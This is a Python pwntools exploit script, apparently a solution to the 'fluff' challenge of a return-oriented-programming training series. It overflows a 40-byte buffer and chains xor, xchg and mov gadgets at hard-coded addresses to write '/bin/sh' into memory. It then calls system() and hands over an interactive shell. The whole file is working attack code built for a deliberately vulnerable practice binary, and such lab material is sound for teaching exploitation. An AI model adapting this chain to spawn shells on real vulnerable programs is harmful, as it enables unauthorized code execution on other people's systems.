import sys; sys.path.append("../..")
import shared_pwn
from pwn import *

BINARY_NAME = "fluff"
BUFFER_LEN = 40

def mov_into_r11(d):
    p =  b""
    p += xor_cls
    p += junk_ptr       # pop r14
    p += pop_r12      
    p += d
    p += xor_add
    p += junk_ptr       # pop r12

    return p

junk = b"\x90" * BUFFER_LEN
junk_ptr = p64(0x90)

command = str.encode("/bin/sh\0")

# Gadgets
mov_gad = p64(0x040084e) # mov qword ptr [r10], r11; pop r13; pop r12; xor byte ptr [r10], r12b; ret; 
xor_cls = p64(0x0400822) # xor r11, r11; pop r14; mov edi, 0x601050; ret;
xor_add = p64(0x040082f) # xor r11, r12; pop r12; mov r13d, 0x604060; ret;
xch_gad = p64(0x0400840) # xchg r11, r10; pop r15; mov r11d, 0x602050; ret;
pop_r12 = p64(0x0400832) # pop r12; mov r13d, 0x604060; ret;)

pop_rdi = p64(0x04008c3) # pop rdi; ret;)

# Pointers
data_addr = p64(0x601050 + 2)
sys_addr  = p64(0x400810)

# Payload creation
payload = b""
payload += junk

# Moves addres into r10
payload += mov_into_r11(data_addr)
payload += xch_gad
payload += junk_ptr

# Moves command into r11
payload += mov_into_r11(command)

# Loads command into memory
payload += mov_gad
payload += junk_ptr  # pop r13 
payload += p64(0x00) # pop r12 - Blanks because of the XOR in the chain

# System call
payload += pop_rdi
payload += data_addr
payload += sys_addr

io = process(f"./{BINARY_NAME}")
io.recvuntil("> ")
io.send(payload)
io.send("\n")
io.interactive()

# sys.stdout.buffer.write(payload)